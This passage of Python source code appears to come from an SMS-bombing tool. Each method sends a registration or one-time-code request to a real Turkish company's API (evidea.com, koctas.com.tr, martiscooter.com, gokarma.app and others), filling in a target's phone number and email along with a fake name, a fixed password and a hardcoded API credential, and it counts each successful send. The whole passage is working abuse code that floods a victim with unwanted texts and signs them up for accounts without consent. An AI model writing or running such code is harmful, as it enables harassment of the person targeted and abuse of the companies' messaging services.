            data = f"--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u--\r\n"
            r = requests.post(url, headers=headers, data=data)
            if (r.status_code) == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> madamecoco.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> madamecoco.com")
            
            
    #balikesiruludag.com.tr
    def Buludag(self):
        try:
            r = requests.get(f"https://bilet.balikesiruludag.com.tr:443/mobil/UyeOlKontrol.php?CepTelefon={self.phone}")
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bilet.balikesiruludag.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bilet.balikesiruludag.com.tr")   
            
    
    #evidea.com
    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            r = requests.post(url, headers=headers, data=data)      
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com")
            
    
    #koctas.com.tr
    def Koctas(self):
        try:
            url = "https://occ2.koctas.com.tr:443/koctaswebservices/v2/koctas/registerParo/get-register-parocard-otp"
            data = {"givePermission": "true", "mobileNumber": self.phone}
            r = requests.post(url, data=data)
            if (r.json()["status"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> occ2.koctas.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> occ2.koctas.com.tr")
            
            
    #gratis.com
    def Gratis(self):
        try:
            token = requests.get("https://ivt.mobildev.com:443/auth", headers={"Accept": "*/*", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Authorization": "Basic NDkxNTkwNjU2OTpnMDg1M2YzY3Z0cjJkYXowYTFodXE3bnNveGZ6cTA=", "Connection": "close"}).json()["access_token"]
            url = "https://ivt.mobildev.com:443/data/0e80tyg8"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": f"Bearer {token}", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}
            json={"accountType": 0, "coordinate": {"lat": 0, "lon": 0}, "customId": "", "email": self.mail, "etk": {"call": 2, "email": 2, "emailFrequency": 2, "emailFrequencyType": 1, "msisdn": 1, "msisdnFrequency": 2, "msisdnFrequencyType": 1, "share": 1}, "extended": {"loyalty": 11}, "firstName": "Memati", "kvkk": {"international": 1, "process": 1, "share": 1}, "language": "tr", "lastName": "Bas", "msisdn": self.phone, "note": "\xc4\xb0zin S\xc3\xbcreci Ba\xc5\x9flatma", "permSource": 3}
            r = requests.post(url, headers=headers, json=json)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ivt.mobildev.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ivt.mobildev.com")
    
    
    #anadolu.com.tr
    def Anadolu(self):
        try:
            url = f"https://www.anadolu.com.tr:443/mobil/OneriSms2.php?Numara={self.phone}&NAME=Memati%20Bas"
            r = requests.get(url)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> anadolu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> anadolu.com.tr")
            
            
    #accordors.com
    def Accordors(self):
        try:
            url = "http://aouws.accordors.com:80/api"
            json={"apiVersion": "0.1.0", "id": "", "method": "members.new", "params": {"email": self.mail, "firstname": "Memati", "gender": "male", "identityno": "00000000001", "lastname": "Bas", "password": "31ABC..abc31", "phone": self.phone}}
            r = requests.post(url, json=json)
            if r.json()["data"]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> aouws.accordors.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> aouws.accordors.com")
            
        
    #marti.tech
    def Marti(self):
        try:
            url = "https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin"
            json={"mobilePhone": self.phone, "mobilePhoneCountryCode": "90", "oneSignalId": ""}
            r = requests.post(url,  json=json)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> customer.martiscooter.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")
            
    
    #hoplagit.com
    def Hop(self):
        try:
            url = "https://api.hoplagit.com:443/v1/auth:reqSMS"
            json={"phone": f"+90{self.phone}"}
            r = requests.post(url,  json=json)
            if r.status_code == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.hoplagit.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hoplagit.com")
            
    
    #gokarma.app
    def Karma(self):
        try:
            url = "https://api.gokarma.app:443/v1/auth/send-sms"
            json={"deviceId": "31", "language": "tr-TR", "phoneNumber": f"90{self.phone}", "type": "REGISTER"}
            r = requests.post(url,  json=json)
            if r.status_code == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.gokarma.app")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.gokarma.app")
